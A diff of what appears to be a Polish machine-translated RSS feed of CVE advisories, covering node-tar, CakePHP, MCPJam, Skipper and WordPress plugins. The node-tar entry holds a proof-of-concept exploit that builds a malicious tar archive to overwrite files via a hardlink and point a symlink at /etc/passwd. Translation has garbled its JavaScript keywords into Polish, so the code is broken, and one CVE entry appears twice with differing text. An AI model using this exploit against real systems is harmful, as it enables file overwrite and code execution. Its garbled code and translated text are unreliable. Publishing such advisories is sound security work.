@@ -1,5 +1,110 @@
 <?xml version='1.0' encoding='utf-8'?>
-<rss version="2.0"><channel><title>CVE 2026 Feed</title><link>https://cve.circl.lu</link><description>CVE z roku 2026</description><item><title>CVE-2019-25297</title><link>https://nvd.nist.gov/vuln/detail/CVE-2019-25297</link><pubDate>Fri, 16 Jan 2026 20:14:10 +0000</pubDate><description>Wtyczka do tworzenia ankiet, ankiet i quizów według etapu opinii Wersje wtyczek Wordpress starsze niż 19.6.25 zawierają zapisaną lukę w zabezpieczeniach XSS (cross-site scripting) poprzez wiele parametrów wynikającą z niewystarczającej weryfikacji danych wejściowych i ucieczki danych wyjściowych.Nieuwierzytelniony atakujący może wstrzyknąć dowolny skrypt do treści, który zostanie wykonany, gdy ofiara wyświetli stronę, której dotyczy problem.</description></item><item><title>CVE-2026-23744</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-23744</link><pubDate>Fri, 16 Jan 2026 20:10:37 +0000</pubDate><description>Inspektor MCPJam to lokalna platforma programistyczna dla serwerów MCP.Wersje 1.4.2 i wcześniejsze są podatne na lukę umożliwiającą zdalne wykonanie kodu (RCE), która umożliwia osobie atakującej wysłanie spreparowanego żądania HTTP, które uruchamia instalację serwera MCP, prowadząc do RCE.Ponieważ inspektor MCPJam domyślnie nasłuchuje na 0.0.0.0 zamiast 127.0.0.1, osoba atakująca może zdalnie uruchomić RCE za pomocą prostego żądania HTTP.
+<rss version="2.0"><channel><title>CVE 2026 Feed</title><link>https://cve.circl.lu</link><description>CVE z roku 2026</description><item><title>CVE-2026-23745</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-23745</link><pubDate>Fri, 16 Jan 2026 21:16:20 +0000</pubDate><description>### Podsumowanie
+
+Biblioteka `node-tar` (`&lt;= 7.5.2`) nie oczyszcza `linkpath` wpisów `Link` (twarde łącze) i `SymbolicLink`, gdy `preservePaths` ma wartość false (domyślne bezpieczne zachowanie).Umożliwia to złośliwym archiwom ominięcie ograniczeń związanych z rootem ekstrakcji, co prowadzi do **arbitralnego nadpisywania plików** za pośrednictwem twardych dowiązań i **zatruwania dowiązań symbolicznych** poprzez bezwzględne cele dowiązań symbolicznych.
+
+### Szczegóły
+
+Luka występuje w `src/unpack.ts` w metodach `[HARDLINK]` i `[SYMLINK]`.
+
+**1.Hardlink Escape (dowolne nadpisanie pliku)**
+
+Logika ekstrakcji używa `path.resolve(this.cwd, Entry.linkpath)` do określenia celu dowiązania twardego.Standardowe zachowanie Node.js nakazuje, że jeśli drugi argument („entry.linkpath”) jest **ścieżką bezwzględną**, „path.resolve” całkowicie ignoruje pierwszy argument („this.cwd”) i zwraca ścieżkę bezwzględną.
+
+Biblioteka nie sprawdza, czy ten rozpoznany cel pozostaje w katalogu głównym ekstrakcji.Złośliwe archiwum może utworzyć dowiązanie stałe do poufnego pliku na hoście (np. `/etc/passwd`), a następnie dokonać w nim zapisu, jeśli uprawnienia pliku pozwalają na zapis w pliku docelowym, z pominięciem istniejących zabezpieczeń opartych na ścieżkach.
+
+**2.Zatrucie dowiązań symbolicznych**
+
+Logika wyodrębniania przekazuje dostarczoną przez użytkownika ścieżkę „entry.linkpath” bezpośrednio do pliku „fs.symlink” bez sprawdzania poprawności.Umożliwia to tworzenie dowiązań symbolicznych wskazujących wrażliwe bezwzględne ścieżki systemowe lub ścieżki przechodnie („../../”), nawet jeśli używane są domyślne ustawienia bezpiecznego wyodrębniania.
+
+### PoC
+
+Poniższy skrypt generuje binarne archiwum TAR zawierające złośliwe nagłówki (dowiązanie stałe do pliku lokalnego i dowiązanie symboliczne do `/etc/passwd`).Następnie rozpakowuje archiwum przy użyciu standardowych ustawień `node-tar` i demonstruje lukę, sprawdzając, czy lokalny „tajny” plik został pomyślnie nadpisany.
+
+```javascript
+const fs = wymagaj('fs')
+stała ścieżka = wymaganie („ścieżka”)
+const tar = wymagaj('tar')
+
+const out = path.resolve('out_repro')
+const secret = path.resolve('secret.txt')
+const plik tar = ścieżka.resolve('exploit.tar')
+const targetSym = '/etc/passwd'
+
+// Czyszczenie i konfiguracja
+spróbuj { fs.rmSync(out, {recursive:true, force:true});fs.unlinkSync(sekret) } catch {}
+fs.mkdirSync(wyjście)
+fs.writeFileSync(sekret, 'ORIGINAL_DATA')
+
+// 1. Utwórz złośliwy nagłówek łącza (dowiązanie twarde do bezwzględnego pliku lokalnego)
+const h1 = nowy tar.Header({
+ścieżka: „exploit_hard”,
+wpisz: „Link”,
+rozmiar: 0,
+ścieżka łącza: sekret
+})
+h1.encode()
+
+// 2. Utwórz złośliwy nagłówek dowiązania symbolicznego (dowiązanie symboliczne do /etc/passwd)
+const h2 = nowy tar.Header({
+ścieżka: „exploit_sym”,
+wpisz: 'SymbolicznyLink',
+rozmiar: 0,
+ścieżka łącza: targetSym
+})
+h2.encode()
+
+// Zapisz binarny tar
+fs.writeFileSync(tarFile, Buffer.concat([ h1.block, h2.block, Buffer.alloc(1024) ]))
+
+console.log('[*] Wyodrębnianie złośliwego pliku tar...')
+
+// 3. Wyodrębnij z domyślnymi bezpiecznymi ustawieniami
+tar.x({
+cwd: na zewnątrz,
+plik: tarFile,
+zachowajPaths: fałsz
+}).potem(() =&gt; {
+console.log('[*] Sprawdzanie ładunku...')
+
+// Przetestuj nadpisanie twardego łącza
+spróbuj {
+fs.writeFileSync(path.join(out, 'exploit_hard'), 'NADPISANE')
+
+if (fs.readFileSync(secret, 'utf8') === 'NADPISANE') {
+console.log('[+] VULN POTWIERDZONO: Nadpisanie twardego łącza powiodło się')
+} jeszcze {
+console.log('[-] Niepowodzenie połączenia twardego')
+}
+} złapać (e) {}
+
+// Przetestuj zatrucie dowiązań symbolicznych
+spróbuj {
+if (fs.readlinkSync(path.join(out, 'exploit_sym')) === targetSym) {
+console.log('[+] VULN POTWIERDZONY: Dowiązanie symboliczne wskazuje ścieżkę bezwzględną')
+} jeszcze {
+console.log('[-] Dowiązanie symboliczne nie powiodło się')
+}
+} złapać (e) {}
+})
+
+```
+
+### Wpływ
+
+* **Arbitralne nadpisanie pliku:** osoba atakująca może nadpisać dowolny plik, do którego ma dostęp proces wyodrębniania, omijając ograniczenia bezpieczeństwa oparte na ścieżce.Nie przyznaje prawa zapisu do plików, do których proces wyodrębniania nie miałby dostępu w inny sposób, takich jak pliki konfiguracyjne należące do roota.
+* **Zdalne wykonanie kodu (RCE):** W środowiskach CI/CD lub zautomatyzowanych potokach nadpisanie plików konfiguracyjnych, skryptów lub plików binarnych prowadzi do wykonania kodu.(Jednakże nie ma to wpływu na npm, ponieważ odfiltrowuje wszystkie wpisy tar `Link` i `SymbolicLink` z wyodrębnionych pakietów.)</description></item><item><title>CVE-2026-23643</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-23643</link><pubDate>Fri, 16 Jan 2026 21:00:44 +0000</pubDate><description>### Wpływ
+Metoda `PaginatorHelper::limitControl()` zawiera lukę w zabezpieczeniach umożliwiającą wykonywanie skryptów między witrynami poprzez manipulację parametrami ciągu zapytania.
+
+### Poprawki
+Ten problem został rozwiązany w wersjach 5.2.12 i 5.3.1
+
+### Obejścia
+Jeśli nie możesz dokonać aktualizacji, powinieneś unikać używania `Paginator::limitControl()` do czasu, aż będzie to możliwe.</description></item><item><title>CVE-2026-23800</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-23800</link><pubDate>Fri, 16 Jan 2026 20:40:13 +0000</pubDate><description>Luka w zabezpieczeniach nieprawidłowego przypisania uprawnień w złączu modułowym Modular DS umożliwia eskalację uprawnień. Ten problem dotyczy Modular DS: od wersji 2.5.2 do wersji 2.6.0.
+
+CVSS Score: 10.0 (critical)</description></item><item><title>CVE-2026-23643</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-23643</link><pubDate>Fri, 16 Jan 2026 20:38:45 +0000</pubDate><description>CakePHP to framework szybkiego rozwoju dla PHP.Metoda PaginatorHelper::limitControl() zawiera lukę w zabezpieczeniach umożliwiającą wykonywanie skryptów między witrynami poprzez manipulację parametrami ciągu zapytania.Ten problem został rozwiązany w wersjach 5.2.12 i 5.3.1.
+
+CVSS Score: 5.4 (medium)</description></item><item><title>CVE-2019-25297</title><link>https://nvd.nist.gov/vuln/detail/CVE-2019-25297</link><pubDate>Fri, 16 Jan 2026 20:14:10 +0000</pubDate><description>Wtyczka do tworzenia ankiet, ankiet i quizów według etapu opinii Wersje wtyczek Wordpress starsze niż 19.6.25 zawierają zapisaną lukę w zabezpieczeniach XSS (cross-site scripting) poprzez wiele parametrów wynikającą z niewystarczającej weryfikacji danych wejściowych i ucieczki danych wyjściowych.Nieuwierzytelniony atakujący może wstrzyknąć dowolny skrypt do treści, który zostanie wykonany, gdy ofiara wyświetli stronę, której dotyczy problem.</description></item><item><title>CVE-2026-23744</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-23744</link><pubDate>Fri, 16 Jan 2026 20:10:37 +0000</pubDate><description>Inspektor MCPJam to lokalna platforma programistyczna dla serwerów MCP.Wersje 1.4.2 i wcześniejsze są podatne na lukę umożliwiającą zdalne wykonanie kodu (RCE), która umożliwia osobie atakującej wysłanie spreparowanego żądania HTTP, które uruchamia instalację serwera MCP, prowadząc do RCE.Ponieważ inspektor MCPJam domyślnie nasłuchuje na 0.0.0.0 zamiast 127.0.0.1, osoba atakująca może zdalnie uruchomić RCE za pomocą prostego żądania HTTP.
 
 CVSS Score: 9.8 (critical)</description></item><item><title>CVE-2012-10064</title><link>https://nvd.nist.gov/vuln/detail/CVE-2012-10064</link><pubDate>Fri, 16 Jan 2026 20:10:13 +0000</pubDate><description>Wersje wtyczek Omni Secure Files starsze niż 0.1.14 zawierają dowolną lukę w zabezpieczeniach umożliwiającą przesyłanie plików w dołączonym przykładowym punkcie końcowym plupload.Procedura obsługi /wp-content/plugins/omni-secure-files/plupload/examples/upload.php umożliwia nieuwierzytelnione przesyłanie bez wymuszania ograniczeń dotyczących bezpiecznych typów plików, umożliwiając atakującemu umieszczenie kontrolowanych przez niego plików w katalogu przesyłania wtyczki.Może to prowadzić do zdalnego wykonania kodu, jeśli zostanie przesłany plik wykonywalny serwera, a następnie uzyskany zostanie do niego dostęp.</description></item><item><title>CVE-2026-23742</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-23742</link><pubDate>Fri, 16 Jan 2026 20:07:46 +0000</pubDate><description>Skipper to router HTTP i odwrotne proxy do tworzenia usług.Domyślna konfiguracja skippera przed wersją 0.23.0 to -lua-sources=inline,file.Problem zaczyna się, gdy niezaufani użytkownicy mogą tworzyć filtry Lua z powodu -lua-sources=inline , na przykład za pośrednictwem zasobu Kubernetes Ingress.Wbudowana konfiguracja umożliwia tym użytkownikom utworzenie skryptu, który jest w stanie odczytać system plików dostępny dla procesu skippera, a jeśli użytkownik ma dostęp do odczytu dzienników, odczyta sekrety skippera.Luka ta została naprawiona w wersji 0.23.0.
 
